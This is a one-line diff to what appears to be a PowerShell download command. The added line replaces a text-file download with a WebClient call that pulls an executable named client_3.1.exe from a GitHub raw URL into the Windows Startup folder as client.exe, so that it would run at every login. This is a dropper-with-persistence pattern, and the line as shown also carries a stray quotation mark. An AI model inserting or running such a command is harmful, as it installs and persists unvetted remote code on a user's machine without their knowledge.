@@ -1,1 +1,1 @@
-(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
+(new-object System.Net.WebClient).DownloadFile('https://github.com/pivog/ncw/raw/main/client_3.1.exe',"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\client.exe"')
